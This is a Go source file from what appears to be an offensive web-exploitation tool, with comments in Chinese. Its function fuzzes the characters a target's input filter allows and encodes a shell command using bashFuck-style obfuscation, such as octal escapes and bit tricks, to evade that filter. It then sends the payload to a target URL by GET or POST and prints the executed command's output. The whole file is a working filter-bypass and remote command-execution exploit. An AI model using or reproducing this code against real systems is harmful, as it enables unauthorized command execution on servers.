package script

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

func Noshuzisystem(URL string, command string, guolv string, i string, m string) bool {
	fmt.Printf(inf + "这是一个system命令，我们需要利用linux终端的一些特性来完成\n")
	fmt.Printf(inf + "本函数基于探姬大佬的bashfuck工具进行二开，原项目地址：https://github.com/ProbiusOfficial/bashFuck\n")
	char := Fuzz(URL, m, i)
	re := regexp.MustCompile("[" + guolv + "]")
	char = re.ReplaceAllString(char, "")

	var rec string
	var req *http.Request
	client := &http.Client{}
	var err error
	fmt.Println(inf + "fuzz结果为：" + char)

	if strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '1') && strings.ContainsRune(char, '2') && strings.ContainsRune(char, '3') && strings.ContainsRune(char, '4') && strings.ContainsRune(char, '5') && strings.ContainsRune(char, '6') && strings.ContainsRune(char, '7') && strings.ContainsRune(char, '\\') {

		rec = CommonOtc(command)
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '1') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') {

		rec = BashfuckX(command, "bit")
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') {

		rec = BashfuckX(command, "zero")
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '!') && strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') {

		rec = BashfuckX(command, "c")
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '!') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '&') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '=') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') && strings.ContainsRune(char, '~') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '_') {

		rec = BashfuckY(command)
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else {
		fmt.Println(WARNING + "bashfuck失灵了呜呜呜,你自己额外去想构造吧")
		return false
	}

	newURL := fmt.Sprintf("%s?%s=%s", URL, i, url.QueryEscape(rec))

	// 创建请求对象
	if m == "GET" {
		req, err = http.NewRequest("GET", newURL, nil)
		if err != nil {
			fmt.Println("Error creating GET request:", err)

		}
	} else if m == "POST" {

		payload := []byte(i + "=" + command)

		// 发起 POST 请求
		resp, err := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
		if err != nil {
			fmt.Println("发送 POST 请求失败:", err)
			return false
		}
		defer resp.Body.Close()

		// 读取响应
		respBody, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("读取响应失败:", err)
			return false
		}

		// 输出响应
		fmt.Println("POST 请求响应:")
		fmt.Println(RemoveHTMLTags(string(respBody)))

	} else {
		fmt.Println("无效请求方式")
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)

	}
	defer resp.Body.Close()

	// 读取响应内容
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)

	}
	cleanText := CleanText(URL)
	result := strings.Replace(RemoveHTMLTags(string(body)), cleanText, "", -1)
	fmt.Printf(inf+"执行结果为: %s\n", result)
	return true
}

func Pwd(URL string, char string) {
	//fmt.Println(inf + "fuzz出的可用字符有" + char)

}
